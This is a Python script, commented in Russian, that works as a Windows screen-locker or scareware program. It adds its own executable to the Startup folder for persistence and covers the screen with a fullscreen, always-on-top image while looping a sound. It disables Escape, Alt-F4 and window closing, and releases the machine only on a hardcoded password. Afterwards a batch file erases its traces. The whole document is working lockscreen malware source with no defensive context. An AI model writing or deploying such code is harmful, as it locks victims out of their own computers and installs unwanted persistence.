import tkinter as tk
from PIL import Image, ImageTk
import os
import sys
import shutil
import threading
import pygame
import subprocess
import time

# === НАСТРОЙКИ ===
IMAGE_PATH = r"E:\vova.jpg"     # путь к картинке
SOUND_PATH = r"E:\vova2.mp3"     # путь к звуку
PASSWORD = "200806026"                # пароль

# === ДОБАВЛЕНИЕ В АВТОЗАПУСК ===
def add_to_startup():
    startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.executable
    dest = os.path.join(startup, os.path.basename(exe_path))
    if not os.path.exists(dest):
        try:
            shutil.copy2(exe_path, dest)
        except Exception as e:
            print("Ошибка автозапуска:", e)
    return dest

startup_copy_path = add_to_startup()

# === ЗВУК ===
def play_sound():
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(SOUND_PATH)
        pygame.mixer.music.play(-1)
    except Exception as e:
        print("Ошибка звука:", e)

threading.Thread(target=play_sound, daemon=True).start()

# === ГРАФИКА ===
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.config(cursor="none")
root.protocol("WM_DELETE_WINDOW", lambda: None)

def block_keys(event): return "break"
for key in ["<Escape>", "<Alt-F4>", "<Control-w>", "<Command-w>"]:
    root.bind_all(key, block_keys)

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
img = Image.open(IMAGE_PATH).resize((screen_width, screen_height), Image.LANCZOS)
photo = ImageTk.PhotoImage(img)
label = tk.Label(root, image=photo)
label.pack()

entry = tk.Entry(root, show="*", font=("Arial", 24), justify="center")
entry.place(relx=0.5, rely=0.9, anchor="center")
entry.lower()

# === САМОУДАЛЕНИЕ ===
def self_delete():
    exe_path = sys.executable
    bat_path = exe_path + ".bat"

    with open(bat_path, "w") as f:
        f.write(f"""
        @echo off
        timeout /t 1 >nul
        del "{exe_path}" >nul 2>&1
        del "{startup_copy_path}" >nul 2>&1
        del "%~f0"
        """)

    subprocess.Popen([bat_path], shell=True)

# === ПРОВЕРКА ПАРОЛЯ ===
def check_password(event=None):
    if entry.get() == PASSWORD:
        pygame.mixer.music.stop()
        root.destroy()
        self_delete()
    else:
        entry.delete(0, tk.END)

entry.bind("<Return>", check_password)
root.bind("<Key>", lambda e: (entry.lift(), entry.focus_set()))

root.mainloop()
